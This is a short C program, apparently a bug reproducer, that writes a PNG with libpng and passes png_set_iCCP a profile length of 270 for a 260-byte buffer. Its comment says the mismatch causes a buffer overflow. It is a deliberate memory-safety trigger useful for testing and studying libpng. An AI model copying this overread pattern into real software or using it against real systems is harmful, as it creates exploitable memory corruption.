#include <stdio.h>
#include <stdlib.h>
#include "png.h"

int main() {
    FILE *fp = fopen("out.png", "wb");
    if (!fp) return 1;

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) return 1;

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) return 1;

    if (setjmp(png_jmpbuf(png_ptr))) {
        fprintf(stderr, "Error writing PNG.\n");
        exit(1);
    }

    png_init_io(png_ptr, fp);
    png_set_IHDR(png_ptr, info_ptr, 1, 1, 8, PNG_COLOR_TYPE_RGB,
        PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);

    // profile w/ first 4 bytes = length of profile + space for data 
    png_bytep profile = (png_bytep)png_malloc(png_ptr, 260);
    profile[0] = 0x00;
    profile[1] = 0x00;
    profile[2] = 0x01;
    profile[3] = 0x00;

    // giving a profile_len bigger than actual length leads to buffer overflow 
    png_set_iCCP(png_ptr, info_ptr, "bad", 0, profile, 270);
    

    png_write_info(png_ptr, info_ptr);

    free(profile);
    fclose(fp);
    png_destroy_write_struct(&png_ptr, &info_ptr);

    return 0;
}